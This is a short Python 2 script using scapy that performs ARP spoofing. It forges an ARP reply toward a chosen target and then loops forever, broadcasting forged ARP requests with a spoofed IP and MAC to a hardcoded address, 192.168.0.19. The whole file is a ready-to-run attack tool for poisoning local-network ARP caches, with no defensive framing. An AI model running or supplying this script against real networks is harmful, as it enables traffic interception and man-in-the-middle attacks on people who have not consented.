import sys
import scapy.all
import time

if len(sys.argv) < 5:
	print "++Usage: python arp_spoofing.py [ip_target] [mac_target] [ip_to_change] [mac_to_change]"
	exit(0)

iptarget = sys.argv[1]
mactarget = sys.argv[2]
ipcostum = sys.argv[3]
maccostum = sys.argv[4]

arppkt = (scapy.all.Ether()/scapy.all.ARP())
arppkt.src = maccostum
arppkt.dst = mactarget
arppkt.hwdst = mactarget
arppkt.pdst = iptarget
arppkt.hwsrc = maccostum
arppkt.psrc = ipcostum
arppkt.op = 'is-at'

arppkt2 = (scapy.all.Ether()/scapy.all.ARP())
arppkt2.src = maccostum
arppkt2.dst = 'ff:ff:ff:ff:ff:ff'
arppkt2.hwdst = '00:00:00:00:00:00'
arppkt2.pdst = '192.168.0.19'
arppkt2.hwsrc = maccostum
arppkt2.psrc = ipcostum
arppkt2.op = 'who-has'

arppkt.show()
while 1 == 1:
	scapy.all.sendp(arppkt2)
	time.sleep(8)
